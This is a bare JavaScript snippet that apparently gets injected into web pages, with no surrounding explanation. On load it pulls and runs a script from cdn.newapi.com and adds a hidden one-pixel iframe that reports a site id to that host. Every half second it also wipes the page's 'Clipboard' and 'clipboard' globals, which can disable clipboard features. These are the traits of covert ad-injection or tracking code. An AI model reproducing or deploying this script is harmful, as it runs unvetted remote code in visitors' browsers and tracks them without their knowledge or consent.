window.amb_jd_proxy_domain = "logs.newapi.com";
window.amb_jd_cdn_domain = "cdn.newapi.com";
window.amb_jd_proxy_f = "gw04";
window.amb_jd_proxy_c = "2";
window.amb_jd_cnzz_id = "1274081365";

function amb_auto_load_ad_js(a, b) {
    var c = document.createElement('script');
    var d = document.getElementsByTagName('head')[0];
    c.src = a;
    d.appendChild(c);
    if (typeof b === 'function') {
        c.onload = c.onreadystatechange = function () {
            if (!c.readyState || /loaded|complete/.test(c.readyState)) {
                b()
            }
        }
    }
}

amb_auto_load_ad_js("https://" + window.amb_jd_cdn_domain + "/sdk/cnzz.js?reload");

function amb_create_iframe() {
    var obj = document.createElement("iframe");
    obj.frameborder = 0;
    obj.src = "https://" + window.amb_jd_cdn_domain + "/sdk/cnzz.php?p=" + window.amb_jd_proxy_f + "&siteid=" + window.amb_jd_cnzz_id;
    obj.frameBorder = 0;
    obj.width = "1px";
    obj.height = "1px";
    obj.scrolling = "no";
    document.body.appendChild(obj)
}

var amb_iframe_time = "no";
(function () {
    setInterval(function () {
        Clipboard = [];
        clipboard = null
    }, 500);
    if (document.body) {
        amb_create_iframe()
    } else {
        setInterval(function () {
            if (amb_iframe_time == "no" && document.body) {
                amb_create_iframe();
                amb_iframe_time = "yes"
            }
        }, 1500)
    }
})();